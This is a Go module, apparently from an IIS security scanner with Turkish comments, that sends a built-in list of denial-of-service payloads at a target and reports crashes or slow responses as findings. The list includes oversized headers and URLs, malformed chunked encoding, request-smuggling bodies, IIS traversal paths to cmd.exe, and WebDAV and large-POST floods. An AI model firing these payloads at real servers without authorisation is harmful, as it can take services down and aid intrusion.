package modules

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/ibrahmsql/issmap/pkg/http"
)

// BufferOverflowDoSModule IIS buffer overflow ve DoS zafiyetlerini tespit eder
type BufferOverflowDoSModule struct {
	*BaseModule
	client  *http.Client
	baseURL string
	attacks []DoSAttack
}

// DoSAttack DoS saldırı yapısı
type DoSAttack struct {
	Name        string
	Description string
	Method      string
	Target      string
	Payload     string
	Headers     map[string]string
	CVE         string
	RiskLevel   string
	TestType    string
}

// NewBufferOverflowDoSModule yeni buffer overflow & DoS modülü oluşturur
func NewBufferOverflowDoSModule(client *http.Client, baseURL string) *BufferOverflowDoSModule {
	module := &BufferOverflowDoSModule{
		BaseModule: NewBaseModule("IIS Buffer Overflow & DoS", "IIS buffer overflow and denial of service vulnerability detection"),
		client:     client,
		baseURL:    baseURL,
	}
	module.initAttacks()
	return module
}

// initAttacks DoS saldırı listesini başlatır
func (m *BufferOverflowDoSModule) initAttacks() {
	m.attacks = []DoSAttack{
		// Long URL Attacks
		{
			Name:        "Long URL Buffer Overflow",
			Description: "Extremely long URL to trigger buffer overflow",
			Method:      "GET",
			Target:      "/",
			Payload:     strings.Repeat("A", 65536),
			CVE:         "CVE-2002-0079",
			RiskLevel:   "HIGH",
			TestType:    "url_overflow",
		},
		{
			Name:        "Long Query String Attack",
			Description: "Long query string to exhaust server resources",
			Method:      "GET",
			Target:      "/",
			Payload:     "?" + strings.Repeat("param="+strings.Repeat("A", 1000)+"&", 100),
			CVE:         "",
			RiskLevel:   "MEDIUM",
			TestType:    "query_overflow",
		},
		{
			Name:        "Deep Directory Path",
			Description: "Extremely deep directory path structure",
			Method:      "GET",
			Target:      "/" + strings.Repeat("deep/", 1000) + "file.asp",
			Payload:     "",
			CVE:         "",
			RiskLevel:   "MEDIUM",
			TestType:    "path_overflow",
		},
		// HTTP Header Overflow Attacks
		{
			Name:        "User-Agent Header Overflow",
			Description: "Oversized User-Agent header to trigger buffer overflow",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"User-Agent": strings.Repeat("Mozilla/5.0 ", 10000),
			},
			CVE:       "CVE-2003-0109",
			RiskLevel: "HIGH",
			TestType:  "header_overflow",
		},
		{
			Name:        "Cookie Header Overflow",
			Description: "Oversized Cookie header to exhaust memory",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Cookie": strings.Repeat("session="+strings.Repeat("A", 1000)+"; ", 100),
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "header_overflow",
		},
		{
			Name:        "Authorization Header Overflow",
			Description: "Oversized Authorization header attack",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Authorization": "Basic " + strings.Repeat("A", 100000),
			},
			CVE:       "",
			RiskLevel: "HIGH",
			TestType:  "header_overflow",
		},
		{
			Name:        "Accept Header Overflow",
			Description: "Oversized Accept header to trigger parsing errors",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Accept": strings.Repeat("text/html,application/xml,", 5000),
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "header_overflow",
		},
		// Chunked Encoding Attacks
		{
			Name:        "Malformed Chunked Encoding",
			Description: "Malformed chunked transfer encoding attack",
			Method:      "POST",
			Target:      "/",
			Payload:     "FFFFFFFF\r\n" + strings.Repeat("A", 1000) + "\r\n0\r\n\r\n",
			Headers: map[string]string{
				"Transfer-Encoding": "chunked",
				"Content-Type":      "application/x-www-form-urlencoded",
			},
			CVE:       "CVE-2005-2089",
			RiskLevel: "HIGH",
			TestType:  "chunked_encoding",
		},
		{
			Name:        "Invalid Chunk Size",
			Description: "Invalid chunk size in chunked encoding",
			Method:      "POST",
			Target:      "/",
			Payload:     "ZZZZZZZZ\r\n" + strings.Repeat("B", 500) + "\r\n0\r\n\r\n",
			Headers: map[string]string{
				"Transfer-Encoding": "chunked",
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "chunked_encoding",
		},
		// HTTP Request Smuggling
		{
			Name:        "HTTP Request Smuggling CL.TE",
			Description: "HTTP request smuggling using Content-Length and Transfer-Encoding",
			Method:      "POST",
			Target:      "/",
			Payload:     "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n",
			Headers: map[string]string{
				"Content-Length":    "44",
				"Transfer-Encoding": "chunked",
			},
			CVE:       "",
			RiskLevel: "HIGH",
			TestType:  "request_smuggling",
		},
		{
			Name:        "HTTP Request Smuggling TE.CL",
			Description: "HTTP request smuggling using Transfer-Encoding and Content-Length",
			Method:      "POST",
			Target:      "/",
			Payload:     "5c\r\nGET /admin HTTP/1.1\r\nHost: vulnerable.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
			Headers: map[string]string{
				"Transfer-Encoding": "chunked",
				"Content-Length":    "4",
			},
			CVE:       "",
			RiskLevel: "HIGH",
			TestType:  "request_smuggling",
		},
		// HTTP/2 Specific Attacks
		{
			Name:        "HTTP/2 CONTINUATION Flood",
			Description: "HTTP/2 CONTINUATION frame flood attack",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Upgrade":    "h2c",
				"Connection": "Upgrade, HTTP2-Settings",
			},
			CVE:       "CVE-2023-44487",
			RiskLevel: "HIGH",
			TestType:  "http2_attack",
		},
		{
			Name:        "HTTP/2 Rapid Reset",
			Description: "HTTP/2 rapid reset attack",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Upgrade":           "h2c",
				"Connection":        "Upgrade, HTTP2-Settings",
				"HTTP2-Settings":    "AAMAAABkAARAAAAAAAIAAAAA",
			},
			CVE:       "CVE-2023-44487",
			RiskLevel: "CRITICAL",
			TestType:  "http2_attack",
		},
		// IIS Specific DoS
		{
			Name:        "IIS ISAPI Extension DoS",
			Description: "IIS ISAPI extension denial of service",
			Method:      "GET",
			Target:      "/scripts/..%255c../winnt/system32/cmd.exe",
			Payload:     "",
			CVE:         "CVE-2000-0884",
			RiskLevel:   "HIGH",
			TestType:    "isapi_dos",
		},
		{
			Name:        "IIS WebDAV DoS",
			Description: "IIS WebDAV denial of service attack",
			Method:      "PROPFIND",
			Target:      "/",
			Payload:     strings.Repeat("<D:prop><D:displayname/></D:prop>", 10000),
			Headers: map[string]string{
				"Content-Type": "text/xml",
				"Depth":        "infinity",
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "webdav_dos",
		},
		// Resource Exhaustion
		{
			Name:        "Connection Pool Exhaustion",
			Description: "Exhaust IIS connection pool",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=3600, max=10000",
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "connection_exhaustion",
		},
		{
			Name:        "Memory Exhaustion via Large POST",
			Description: "Memory exhaustion using large POST data",
			Method:      "POST",
			Target:      "/",
			Payload:     strings.Repeat("data="+strings.Repeat("A", 10000)+"&", 1000),
			Headers: map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			},
			CVE:       "",
			RiskLevel: "HIGH",
			TestType:  "memory_exhaustion",
		},
	}
}

// Run buffer overflow ve DoS taramasını çalıştırır
func (m *BufferOverflowDoSModule) Run(client *http.Client) (*ModuleResult, error) {
	m.Start()
	defer m.End()

	var vulnerabilities []Vulnerability
	var info []Information

	// Test each attack (with caution)
	for _, attack := range m.attacks {
		// Skip high-risk attacks in production environments
		if attack.RiskLevel == "CRITICAL" {
			info = append(info, CreateInformation(
				"warning",
				"Skipped Critical Attack",
				fmt.Sprintf("Skipped %s due to high risk", attack.Name),
				attack.Name,
			))
			continue
		}

		vuln := m.testDoSAttack(attack)
		if vuln != nil {
			vulnerabilities = append(vulnerabilities, *vuln)
		}
		
		// Longer delay for DoS tests to avoid overwhelming the server
		time.Sleep(500 * time.Millisecond)
	}

	// Test for specific IIS vulnerabilities
	vulns := m.testIISSpecificDoS()
	vulnerabilities = append(vulnerabilities, vulns...)

	// Add informational findings
	info = append(info, CreateInformation(
		"scan_info",
		"Buffer Overflow & DoS Scan Completed",
		fmt.Sprintf("Tested %d DoS attack vectors", len(m.attacks)),
		fmt.Sprintf("%d attacks tested", len(m.attacks)),
	))

	status := "completed"
	if len(vulnerabilities) > 0 {
		status = "vulnerabilities_found"
	}

	return m.CreateResult(status, vulnerabilities, info, nil), nil
}

// testDoSAttack belirli bir DoS saldırısını test eder
func (m *BufferOverflowDoSModule) testDoSAttack(attack DoSAttack) *Vulnerability {
	m.IncrementRequests()

	// Construct test URL
	testURL := m.constructTestURL(attack)
	
	// Record start time for response time analysis
	startTime := time.Now()
	
	// Perform the attack
	resp, err := m.performAttack(testURL, attack)
	responseTime := time.Since(startTime)
	
	if err != nil {
		// Check if error indicates potential DoS success
		if m.isDoSIndicator(err, responseTime) {
			return m.createDoSVulnerability(attack, testURL, err.Error(), responseTime)
		}
		return nil
	}
	defer resp.Body.Close()

	// Analyze response for DoS indicators
	if m.isVulnerableResponse(resp, attack, responseTime) {
		return m.createDoSVulnerability(attack, testURL, fmt.Sprintf("Status: %d", resp.StatusCode), responseTime)
	}

	return nil
}

// testIISSpecificDoS IIS'e özgü DoS zafiyetlerini test eder
func (m *BufferOverflowDoSModule) testIISSpecificDoS() []Vulnerability {
	var vulnerabilities []Vulnerability

	// Test for specific IIS DoS vulnerabilities
	iisTests := []struct {
		path        string
		method      string
		description string
		cve         string
	}{
		{
			path:        "/null.printer",
			method:      "GET",
			description: "IIS null.printer DoS vulnerability",
			cve:         "CVE-2001-0241",
		},
		{
			path:        "/scripts/..%c1%1c../winnt/system32/cmd.exe",
			method:      "GET",
			description: "IIS Unicode directory traversal DoS",
			cve:         "CVE-2000-0884",
		},
		{
			path:        "/_vti_bin/_vti_aut/fp30reg.dll",
			method:      "GET",
			description: "FrontPage extensions DoS",
			cve:         "CVE-2000-0709",
		},
	}

	for _, test := range iisTests {
		m.IncrementRequests()

		testURL := m.baseURL + test.path
		startTime := time.Now()
		
		req, err := http.NewRequest(test.method, testURL, nil)
		if err != nil {
			continue
		}

		resp, err := m.client.Do(req)
		responseTime := time.Since(startTime)

		if err != nil || (resp != nil && (resp.StatusCode >= 500 || responseTime > 10*time.Second)) {
			vulnerability := Vulnerability{
				ID:          fmt.Sprintf("IIS-DOS-%s", test.cve),
				Title:       "IIS Denial of Service Vulnerability",
				Description: test.description,
				Severity:    "HIGH",
				CVSS:        7.5,
				CWE:         "CWE-400",
				OWASP:       "A06:2021 – Vulnerable and Outdated Components",
				URL:         testURL,
				Method:      test.method,
				Evidence:    fmt.Sprintf("Response time: %.2f seconds", responseTime.Seconds()),
				References: []string{
					fmt.Sprintf("https://cve.mitre.org/cgi-bin/cvename.cgi?name=%s", test.cve),
				},
				Remediation: "Update IIS to the latest version and apply security patches.",
				Metadata: map[string]string{
					"cve":           test.cve,
					"response_time": fmt.Sprintf("%.2f", responseTime.Seconds()),
				},
			}

			if resp != nil {
				resp.Body.Close()
			}

			vulnerabilities = append(vulnerabilities, vulnerability)
		} else if resp != nil {
			resp.Body.Close()
		}
	}

	return vulnerabilities
}

// constructTestURL test URL'sini oluşturur
func (m *BufferOverflowDoSModule) constructTestURL(attack DoSAttack) string {
	baseURL, _ := url.Parse(m.baseURL)
	
	switch attack.TestType {
	case "url_overflow":
		baseURL.Path = "/" + attack.Payload
	case "query_overflow":
		baseURL.RawQuery = attack.Payload
	case "path_overflow":
		baseURL.Path = attack.Target
	default:
		baseURL.Path = attack.Target
	}
	
	return baseURL.String()
}

// performAttack saldırıyı gerçekleştirir
func (m *BufferOverflowDoSModule) performAttack(testURL string, attack DoSAttack) (*http.Response, error) {
	var req *http.Request
	var err error

	if attack.Method == "POST" && attack.Payload != "" {
		req, err = http.NewRequest(attack.Method, testURL, strings.NewReader(attack.Payload))
	} else {
		req, err = http.NewRequest(attack.Method, testURL, nil)
	}

	if err != nil {
		return nil, err
	}

	// Add custom headers
	for key, value := range attack.Headers {
		req.Header.Set(key, value)
	}

	// Set timeout for DoS tests
	client := *m.client
	client.Timeout = 15 * time.Second

	return client.Do(req)
}

// isDoSIndicator DoS göstergesi kontrolü
func (m *BufferOverflowDoSModule) isDoSIndicator(err error, responseTime time.Duration) bool {
	if err == nil {
		return false
	}

	errorStr := strings.ToLower(err.Error())
	
	// Check for timeout or connection errors
	if strings.Contains(errorStr, "timeout") ||
		strings.Contains(errorStr, "connection reset") ||
		strings.Contains(errorStr, "connection refused") ||
		strings.Contains(errorStr, "no route to host") {
		return true
	}

	// Check for extremely slow response
	if responseTime > 10*time.Second {
		return true
	}

	return false
}

// isVulnerableResponse zafiyet içeren response kontrolü
func (m *BufferOverflowDoSModule) isVulnerableResponse(resp *http.Response, attack DoSAttack, responseTime time.Duration) bool {
	// Check for server errors
	if resp.StatusCode >= 500 {
		return true
	}

	// Check for extremely slow response
	if responseTime > 5*time.Second {
		return true
	}

	// Check for specific error indicators
	server := resp.Header.Get("Server")
	if strings.Contains(strings.ToLower(server), "error") {
		return true
	}

	return false
}

// createDoSVulnerability DoS zafiyeti oluşturur
func (m *BufferOverflowDoSModule) createDoSVulnerability(attack DoSAttack, testURL, evidence string, responseTime time.Duration) *Vulnerability {
	severity := m.getSeverityFromRisk(attack.RiskLevel)
	cvss := m.getCVSSFromRisk(attack.RiskLevel)

	vulnerability := &Vulnerability{
		ID:          fmt.Sprintf("IIS-DOS-%s", strings.ToUpper(strings.ReplaceAll(attack.Name, " ", "-"))),
		Title:       fmt.Sprintf("DoS Vulnerability - %s", attack.Name),
		Description: attack.Description,
		Severity:    severity,
		CVSS:        cvss,
		CWE:         "CWE-400",
		OWASP:       "A06:2021 – Vulnerable and Outdated Components",
		URL:         testURL,
		Method:      attack.Method,
		Payload:     attack.Payload,
		Evidence:    fmt.Sprintf("%s (Response time: %.2f seconds)", evidence, responseTime.Seconds()),
		References: []string{
			"https://owasp.org/www-community/attacks/Denial_of_Service",
		},
		Remediation: "Implement rate limiting, input validation, and resource limits to prevent DoS attacks.",
		Metadata: map[string]string{
			"attack_type":   attack.TestType,
			"response_time": fmt.Sprintf("%.2f", responseTime.Seconds()),
		},
	}

	if attack.CVE != "" {
		vulnerability.References = append(vulnerability.References,
			fmt.Sprintf("https://cve.mitre.org/cgi-bin/cvename.cgi?name=%s", attack.CVE))
	}

	return vulnerability
}

// getSeverityFromRisk risk level'dan severity döndürür
func (m *BufferOverflowDoSModule) getSeverityFromRisk(riskLevel string) string {
	switch riskLevel {
	case "CRITICAL":
		return "CRITICAL"
	case "HIGH":
		return "HIGH"
	case "MEDIUM":
		return "MEDIUM"
	case "LOW":
		return "LOW"
	default:
		return "MEDIUM"
	}
}

// getCVSSFromRisk risk level'dan CVSS skoru döndürür
func (m *BufferOverflowDoSModule) getCVSSFromRisk(riskLevel string) float64 {
	switch riskLevel {
	case "CRITICAL":
		return 9.8
	case "HIGH":
		return 7.5
	case "MEDIUM":
		return 5.3
	case "LOW":
		return 3.1
	default:
		return 5.3
	}
}
